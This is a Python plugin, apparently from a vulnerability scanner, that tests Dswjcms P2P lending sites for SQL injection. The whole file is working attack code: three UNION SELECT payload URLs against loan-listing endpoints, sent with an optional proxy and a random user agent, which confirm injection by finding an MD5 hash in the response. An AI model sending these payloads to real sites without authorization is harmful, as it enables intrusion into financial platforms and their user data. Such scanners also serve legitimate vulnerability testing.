#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Dswjcms p2p网贷系统前台4处sql注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0141364
author: Ascotbe
reference: Lucifer
description: SQL injection。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payloads = [
    "/Win/Index/loanAjax.html?type=1&state=0)%20UnIoN%20SeLeCt%201,2,3,Md5(1234),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34%23&classify=1&scope=1",
    "/Loan/loanAjax.html?type=1&state=1)%20UnIoN%20SeLeCt%201,2,3,Md5(1234),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34%23&classify=1&scope=1",
    "/Loan.html?search=%27%29+UnIoN+SeLeCt+1%2C2%2C3%2CMd5(1234)%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%2C33%2C34%23"
    ]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    for payload in payloads:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        try:
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
                Medusa = "{} 存在Dswjcms p2p网贷系统注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                return (Medusa)
        except Exception as e:
            pass